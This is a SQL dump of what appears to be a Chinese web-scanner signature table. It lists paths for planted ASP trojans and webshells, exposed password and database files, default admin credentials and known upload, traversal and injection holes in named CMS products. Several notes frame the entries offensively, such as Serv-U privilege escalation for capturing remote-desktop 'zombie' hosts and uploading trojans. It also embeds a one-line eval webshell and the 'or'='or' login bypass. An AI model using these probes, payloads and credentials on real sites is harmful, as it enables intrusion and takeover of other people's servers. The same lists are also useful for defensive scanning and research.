BEGIN TRANSACTION;
DROP TABLE IF EXISTS "hURL";
CREATE TABLE "hURL" (
	"ID" INTEGER NOT NULL, 
	"PATH" VARCHAR, 
	"FILENAME" VARCHAR, 
	"CODE" VARCHAR, 
	"FTYPE" VARCHAR, 
	"NOTE" VARCHAR, 
	PRIMARY KEY ("ID")
);
INSERT INTO "hURL" VALUES(1,'/images/','yesitis.asp','execute','normal','快捷留言簿 蓝屏一句话木马');
INSERT INTO "hURL" VALUES(2,'/images/','yesitis.asp','eval','normal','快捷留言簿  海洋一句话木马');
INSERT INTO "hURL" VALUES(3,'/bbs/data/','shop.asp','execute','normal','超市插件数据库地址 蓝屏一句话木马');
INSERT INTO "hURL" VALUES(4,'/bbs/data/','shop.asp','eval','normal','超市插件数据库地址 海洋一句话木马');
INSERT INTO "hURL" VALUES(5,'/alexa/','fadmy.asa','/alexa/fadmy.asa','normal','alexa作弊的飞速提高 一句话木马');
INSERT INTO "hURL" VALUES(6,'/_vti_pvt/','authors.pwd','# -FrontPage-','normal','Frontpage authors.pwd available');
INSERT INTO "hURL" VALUES(7,'/','新建 文本文档.txt','密码_','normal','_pass 配置信息。');
INSERT INTO "hURL" VALUES(8,'/','sitemap.xml','admin.asp</loc>','normal','"网站地图,有管理入口,数据库路径等敏感信息 "');
INSERT INTO "hURL" VALUES(9,'/','password.txt','','normal','密码信息。');
INSERT INTO "hURL" VALUES(10,'/','pass.txt','','normal','密码信息。');
INSERT INTO "hURL" VALUES(11,'/','mima.txt','','normal','虚拟主机相关密码信息(管理员习惯)。');
INSERT INTO "hURL" VALUES(12,'/','ftp.txt','密码_','normal','_pass 虚拟主机ftp登录信息。');
INSERT INTO "hURL" VALUES(13,'/','aspcheck.asp','探针','normal','asp探针');
INSERT INTO "hURL" VALUES(14,'/','asp.asp','探针','normal','asp探针');
INSERT INTO "hURL" VALUES(15,'/','aaa.asp','空间运行环境检测工具','normal','空间运行环境检测工具');
INSERT INTO "hURL" VALUES(16,'/','123.txt','密码_','normal','_pass 虚拟主机密码信息。');
INSERT INTO "hURL" VALUES(31,'/users/Editer/','SelectPic.asp','<title>选择图片</title>','normal','Editer图片编辑器');
INSERT INTO "hURL" VALUES(32,'/user/','User_Login.asp','password','normal','');
INSERT INTO "hURL" VALUES(33,'/php/bak/','dede_admin.txt','~Insert Into','normal','获得dedecms管理员的md5口令，后台：/admin/index.php');
INSERT INTO "hURL" VALUES(34,'/eWebEditor/','admin_login.asp','password','normal','默认登录用户:admin 默认登录密码:admin');
INSERT INTO "hURL" VALUES(35,'/database/','','Index of /database','normal','搜索普世购物系统，后台管理员的默认帐号和密码是：admin1 admin1，用动感商城上传工具上传马。');
INSERT INTO "hURL" VALUES(36,'/','login.asp','password','normal','管理后台登陆入口');
INSERT INTO "hURL" VALUES(37,'/manage/','login.asp','password','normal','管理后台登陆入口');
INSERT INTO "hURL" VALUES(38,'/admin/','login.asp','password','normal','管理后台登陆入口');
INSERT INTO "hURL" VALUES(39,'/','key.asp','Dvbbs-Key','normal','管理员钥匙工具');
INSERT INTO "hURL" VALUES(40,'/bbs/','key.asp','Dvbbs-Key','normal','管理员钥匙工具');
INSERT INTO "hURL" VALUES(42,'/','','/</title>','normal','iis目录列表开启。(文件名为空表示验证目录路径)');
INSERT INTO "hURL" VALUES(43,'/','','<title>Index of /','normal','apache目录列表开启。');
INSERT INTO "hURL" VALUES(44,'/','','<body><h1>Directory Listing For','normal','Tomcat目录列表开启。');
INSERT INTO "hURL" VALUES(45,'/_mmServerScripts/','MMHTTPDB.asp','','normal','');
INSERT INTO "hURL" VALUES(46,'/_mmServerScripts/','MMHTTPDB.php','','normal','');
INSERT INTO "hURL" VALUES(47,'/_mmDBScripts/','MMHTTPDB.asp','','normal','');
INSERT INTO "hURL" VALUES(48,'/_mmDBScripts/','MMHTTPDB.php','','normal','');
INSERT INTO "hURL" VALUES(49,'/','conn.asp','<%','normal','暴库');
INSERT INTO "hURL" VALUES(50,'/inc/','conn.asp','<%','normal','暴库');
INSERT INTO "hURL" VALUES(51,'/','flash/downfile.asp?url=uploadfile/../../conn.asp','','normal','新云2.1数据库配置文件下载漏洞');
INSERT INTO "hURL" VALUES(52,'/','flash/downfile.asp?url=jackie/../../conn.asp','','normal','数据库配置文件下载漏洞');
INSERT INTO "hURL" VALUES(55,'/shopxp_data/','','application/x-msaccess','normal','shopxp购物系统 默认后台： admin 默认密码：admin-admin');
INSERT INTO "hURL" VALUES(63,'/database/','','application/x-msaccess','normal','嘉缘人才管理系统默认数据库');
INSERT INTO "hURL" VALUES(68,'/data/buk/','','application/x-msaccess','normal','二手网。管理后台/admin 登陆信息在扫到的数据库中找。');
INSERT INTO "hURL" VALUES(71,'/data/','','application/x-msaccess','normal','心动音乐默认数据库路径');
INSERT INTO "hURL" VALUES(72,'/data/','','application/x-msaccess','normal','常用默认数据库路径');
INSERT INTO "hURL" VALUES(79,'/admin/Databackup/','','application/x-msaccess','normal','新云');
INSERT INTO "hURL" VALUES(81,'/Foosun_Data/','','application/x-msaccess','normal','风讯FoosunCMSv4.0');
INSERT INTO "hURL" VALUES(86,'/mhxy/','data.asp','','normal','常用默认数据库路径');
INSERT INTO "hURL" VALUES(92,'/bbs/boke/data/','dvboke.asp','','normal','动网博客漏洞');
INSERT INTO "hURL" VALUES(96,'/boke/data/','dvboke.asp','','normal','动网博客漏洞');
INSERT INTO "hURL" VALUES(98,'/bbs/DV_plus/marry/','plus_marry_db.asp','','normal','结婚插件');
INSERT INTO "hURL" VALUES(99,'/','update.asp','跳过备份','normal','选择备份数据库可获得数据库路径');
INSERT INTO "hURL" VALUES(100,'/bbs/','update.asp','跳过备份','normal','选择备份数据库可获得数据库路径');
INSERT INTO "hURL" VALUES(101,'/','z_shop_newshop.asp','商店招牌','normal','超市插件 一句话木马插入地址');
INSERT INTO "hURL" VALUES(121,'/','diy.asp','绝对路径(包括文件名:如','normal','有上传权限的webshell(无口令)');
INSERT INTO "hURL" VALUES(122,'/bbs/','diy.asp','绝对路径(包括文件名:如','normal','有上传权限的webshell(无口令)');
INSERT INTO "hURL" VALUES(123,'/','myup.asp','绝对路径','normal','上传webshell。');
INSERT INTO "hURL" VALUES(124,'/','ASPAdmin_A.asp','管理登录','normal','ASPAdmin工具 默认密码为hididi.net');
INSERT INTO "hURL" VALUES(125,'/','ASPAdmin.asp','管理登录','normal','ASPAdmin工具 默认密码为hididi.net');
INSERT INTO "hURL" VALUES(126,'/','servu.aspx','Serv-U','normal','"serv-U提权aspx版,获得3389肉鸡的捷径   "');
INSERT INTO "hURL" VALUES(127,'/bbs/','servu.aspx','Serv-U','normal','"serv-U提权aspx版,获得3389肉鸡的捷径   "');
INSERT INTO "hURL" VALUES(128,'/count/update/','update_baidu.asp','1906 更新文件','normal','"COCOON Counter统计程序漏洞 <%eval request(""#"")%>    "');
INSERT INTO "hURL" VALUES(129,'/Reg/','User_Reg1.asp','新会员注册','normal','动易2006 注册asp用户漏洞。');
INSERT INTO "hURL" VALUES(130,'/Reg/','User_Reg.asp','>> 服务条款和声明</title>','normal','动易2006 注册asp用户漏洞。');
INSERT INTO "hURL" VALUES(131,'/','servu.php','Serv-U','normal','"serv-U提权php版,获得3389肉鸡的捷径    "');
INSERT INTO "hURL" VALUES(132,'/','servu.aspx','Serv-U','normal','"serv-U提权aspx版,获得3389肉鸡的捷径    "');
INSERT INTO "hURL" VALUES(133,'/','servu.asp','Serv-U','normal','"serv-U提权asp版,获得3389肉鸡的捷径    "');
INSERT INTO "hURL" VALUES(134,'/bbs/','servu.php','Serv-U','normal','"serv-U提权php版,获得3389肉鸡的捷径    "');
INSERT INTO "hURL" VALUES(135,'/bbs/','servu.aspx','Serv-U','normal','"serv-U提权aspx版,获得3389肉鸡的捷径    "');
INSERT INTO "hURL" VALUES(136,'/bbs/','servu.asp','Serv-U','normal','"serv-U提权asp版,获得3389肉鸡的捷径    "');
INSERT INTO "hURL" VALUES(137,'/','zz.asp','设置站长帐号','normal','惊云下载系统管理员添加文件。');
INSERT INTO "hURL" VALUES(138,'/','wish.php','4.1.0','normal','discuz 4.1.0 许愿池插件远程包含漏洞。');
INSERT INTO "hURL" VALUES(139,'/','web.config','sa;Password=','normal','sql server的sa用户连接信息。');
INSERT INTO "hURL" VALUES(140,'/','up_BookPicPro.asp','上传成功','normal','搜索普世购物系统，后台管理员的默认帐号和密码是：admin1 admin1，漏洞文件是up_BookPicPro.asp，用动感商城上传');
INSERT INTO "hURL" VALUES(141,'/','su.asp','serv-U','normal','"serv-U提权asp版,获得3389肉鸡的捷径。    "');
INSERT INTO "hURL" VALUES(142,'/','servusu.asp','Serv-U','normal','"serv-U提权asp版,获得3389肉鸡的捷径。    "');
INSERT INTO "hURL" VALUES(143,'/','register/userreg_step2.asp','<!----检查用户名，电子邮箱开始-->','normal','最新科汛网站管理系统漏洞。');
INSERT INTO "hURL" VALUES(144,'/','passport_client.php','Illegal request','normal','PHPWind 5.* UPDATE参数远程SQL注入漏洞。');
INSERT INTO "hURL" VALUES(145,'/','manage/login.asp','"<td height=""30"" align=""right"">管理密码：</td>"','normal','用户名和口令均为''or''=''or''');
INSERT INTO "hURL" VALUES(146,'/','Region.asp','国家/地区','normal','动易最新0day:Region.asp注入漏洞。');
INSERT INTO "hURL" VALUES(147,'/','NewComment.asp','document.write','normal','动易2006 SP4 SQL版注入漏洞');
INSERT INTO "hURL" VALUES(148,'/','myup.asp','password','normal','asp网站助手的默认上传文件名。');
INSERT INTO "hURL" VALUES(149,'/','css.asp','password','normal','黑客常用文件名系列。');
INSERT INTO "hURL" VALUES(150,'/','cmd.asp','cmd.exe','normal','执行dos命令的webshell');
INSERT INTO "hURL" VALUES(151,'/bbs/','myup.asp','password','normal','asp网站助手的默认上传文件名。');
INSERT INTO "hURL" VALUES(152,'/bbs/','css.asp','password','normal','黑客常用文件名系列。');
INSERT INTO "hURL" VALUES(153,'/bbs/','cmd.asp','cmd.exe','normal','执行dos命令的webshell');
INSERT INTO "hURL" VALUES(154,'/','xiao.asp','绝对路径','normal','');
INSERT INTO "hURL" VALUES(155,'/','shell.asp','password','normal','黑客常用文件名系列。');
INSERT INTO "hURL" VALUES(156,'/','log.asp','password','normal','需要密码的webshell。');
INSERT INTO "hURL" VALUES(157,'/link/','link_add.asp','友情','normal','申请友情连接页面。');
INSERT INTO "hURL" VALUES(158,'/link/','addlink.asp','友情','normal','申请友情连接页面。');
INSERT INTO "hURL" VALUES(160,'/','web_scanner_test_file.txt','Acunetix','normal','可写目录。');
INSERT INTO "hURL" VALUES(161,'/','setup.asp','安装向导_','normal','_第一步 设置');
INSERT INTO "hURL" VALUES(162,'/','publish.asp','软件简介：','normal','');
INSERT INTO "hURL" VALUES(163,'/','dv_dpo.asp','数据非法，操作中止！','normal','"没有验证DvApi_Enable是否等于True,默认DvApi_SysKey是API_TEST,可以伪造数据    "');
INSERT INTO "hURL" VALUES(164,'/','alert.txt','ZwelL','normal','IIS漏洞:根目录写入权限');
INSERT INTO "hURL" VALUES(165,'/','Trace.axd','Application Trace','normal','ASP.NET application trace enabled');
INSERT INTO "hURL" VALUES(166,'/','ScanWebshell.asp','Password','normal','"lake2的ASP木马查找软件,默认密码eviloctal    "');
INSERT INTO "hURL" VALUES(171,'/','/dede/ruletest.php','规则测试器','normal','dede正则规则测试器');
INSERT INTO "hURL" VALUES(172,'/users/Editer/','SelectPic.asp','选择图片','normal','风讯系统漏洞 - 可以浏览整站文件');
INSERT INTO "hURL" VALUES(173,'/mtv/','upfile.asp','化境','normal','化境上传漏洞。');
INSERT INTO "hURL" VALUES(174,'/','upfile.asp','先选择','normal','论坛上传漏洞');
INSERT INTO "hURL" VALUES(175,'/','upfile.asp','"type=""file"""','normal','论坛上传漏洞');
INSERT INTO "hURL" VALUES(176,'/vod/','upfile.asp','化境','normal','化境上传漏洞。');
INSERT INTO "hURL" VALUES(177,'/music/','upfile.asp','化境','normal','化境上传漏洞。');
INSERT INTO "hURL" VALUES(178,'/bbs/','upfile.asp','先选择','normal','论坛上传漏洞');
INSERT INTO "hURL" VALUES(179,'/bbs/','upfile.asp','"type=""file"""','normal','论坛上传漏洞');
INSERT INTO "hURL" VALUES(180,'/admin/','uploadPic.asp','"type=""file"""','normal','');
INSERT INTO "hURL" VALUES(181,'/','upload_flash.asp','"type=""file"""','normal','上传漏洞');
INSERT INTO "hURL" VALUES(182,'/','upload_Dialog.asp','"type=""file"""','normal','上传漏洞');
INSERT INTO "hURL" VALUES(183,'/','upload.asp','"type=""file"""','normal','上传漏洞');
INSERT INTO "hURL" VALUES(184,'/','upfile_soft.asp','"type=""file"""','normal','上传漏洞');
INSERT INTO "hURL" VALUES(185,'/','upfile_photo.asp','"type=""file"""','normal','上传漏洞');
INSERT INTO "hURL" VALUES(186,'/','upfile_flash.asp','"type=""file"""','normal','上传漏洞');
INSERT INTO "hURL" VALUES(187,'/','upfile_article.asp','"type=""file"""','normal','上传漏洞');
INSERT INTO "hURL" VALUES(188,'/','upfile_adpic.asp','"type=""file"""','normal','上传漏洞');
INSERT INTO "hURL" VALUES(189,'/','upfile.htm','"type=""file"""','normal','');
INSERT INTO "hURL" VALUES(190,'/','upfile.asp','powered by WEBBOY','normal','');
INSERT INTO "hURL" VALUES(191,'/db/','upfile.asp','powered by WEBBOY','normal','');
INSERT INTO "hURL" VALUES(192,'/','upfile.asp','Powered By ：SMT Version 5.0','normal','');
INSERT INTO "hURL" VALUES(193,'/bbs/','upfile.asp','Powered By ：SMT Version 5.0','normal','');
INSERT INTO "hURL" VALUES(194,'/','upfile_flash.asp','Powered By ：SMT Version 5.0','normal','');
INSERT INTO "hURL" VALUES(195,'/bbs/','upfile_flash.asp','Powered By ：SMT Version 5.0','normal','');
INSERT INTO "hURL" VALUES(196,'/admin/','upload_file.asp','同城约会 贺卡传情 情感随笔 热门投票','normal','明小子上传');
INSERT INTO "hURL" VALUES(197,'/manage','Login.asp','公司后台','normal','用"or"="or"');
INSERT INTO "hURL" VALUES(198,'/','Login.asp','公司后台','normal','用"or"="or"');
INSERT INTO "hURL" VALUES(199,'/admin/','Login.asp','企业邮局 企业荣誉 营销网络 产品分类 信息反馈 联系我们 收藏本站 网站管理','normal','后台管理地址,管理员帐号密码=admin');
INSERT INTO "hURL" VALUES(200,'/admin/','Login.asp','Foosun','normal','后台的后缀全是admin/login.asp');
COMMIT;